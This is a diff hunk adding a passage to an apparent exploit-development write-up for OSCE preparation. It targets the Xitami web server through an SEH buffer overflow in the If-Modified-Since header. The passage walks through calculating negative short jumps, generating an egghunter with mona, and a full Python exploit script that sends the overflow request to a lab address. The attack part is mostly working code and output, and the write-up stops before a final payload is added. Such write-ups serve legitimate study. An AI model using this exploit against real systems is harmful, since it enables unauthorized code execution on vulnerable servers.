@@ -379,6 +379,79 @@ s.close()
 
 ![](/assets/images/CTP/xitamiLand.JPG)
 
+We land at `0006FF46`, let's make sure our negative jump was correct. 
+```terminal_session
+root@kali:~/OSCE/ # offset                                             
+Enter Address #1: 6ff78
+Enter Address #2: 6ff46
+[+] Hex offset: 0x32
+[+] Decimal offset: 50
+[-] Negative jump opcodes: \xeb\xcc
+[+] Positive jump opcodes: \xeb\x32
+[-] ESP Sub Adjust Opcodes: \x54\x58\x2c\x32\x50\x5c
+[+] ESP Add Adjust Opcodes: \x54\x58\x04\x32\x50\x5
+```
+
+Awesome, the offset is 50 bytes just like we planned. The trick with negative jumps is that you have to jump back through your jump instruction opcodes (2 bytes). So for a negative jump, you actually have to tell it to jump back `n+2` bytes where `n` is the desired offset. Calculating negative short jumps can be confusing as the values max out at `0x80` which comes right after the largest positive short jump value `0x7f`. So as the value grows after `0x80` (`0x81, 0x82, ...0xff`), the length of the negative jump actually **decreases**! Luckily, `offset.py` takes care of all that calcuation for us. We just give it our desired outcome in decimal. 
+
+## Egghunter
+
+We will use mona to generate an egghunter with the tag `PWNS`. (`!mona egg -t PWNS`)
+```terminal_session
+"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
+"\xef\xb8\x50\x57\x4e\x53\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
+```
+
+Let's add this to our exploit code and make sure we jump to it appropriately. We already know the *true* start of our `A` buffer is `0006FE48`. So let's use `offset.py` to tell us the offset to our current location for where we wanted to place our egghunter. 
+```terminal_session
+root@kali:~/OSCE/ # offset                                            
+Enter Address #1: 6fe48
+Enter Address #2: 6ff46
+[+] Hex offset: 0xfe
+[+] Decimal offset: 254
+[-] ESP Sub Adjust Opcodes: \x54\x58\x2c\x7f\x2c\x7f\x50\x5c
+[+] ESP Add Adjust Opcodes: \x54\x58\x04\x7f\x04\x7f\x50\x5c
+```
+
+So we know we need to put 254 `A` values before our egghunter. Let's update our exploit script. 
+```python
+import socket
+import sys
+
+host = "192.168.1.201"
+port = 80
+
+seh = "\x84\xf5\x44"
+nseh = "\xeb\xcc\x90\x90"
+
+#Tag = PWNS
+egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
+"\xef\xb8\x50\x57\x4e\x53\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")
+
+#PO @ 304
+crash = "A" * 254
+crash += egghunter
+crash += "A" * (304 - len(crash))
+crash += nseh
+crash += seh
+
+
+req = "GET / HTTP/1.1\r\n"
+req += "Host: 192.168.1.201\r\n"
+req += "User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0\r\n"
+req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+req += "Accept-Language: en-US,en;q=0.5\r\n"
+req += "Accept-Encoding: gzip, deflate\r\n"
+req += "Connection: close\r\n"
+req += "Upgrade-Insecure-Requests: 1\r\n"
+req += "If-Modified-Since: Wed, " + crash + "\r\n\r\n"
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((host, port))
+s.send(req)
+s.close()
+```
+
 --TO BE CONTINUED--
 
 
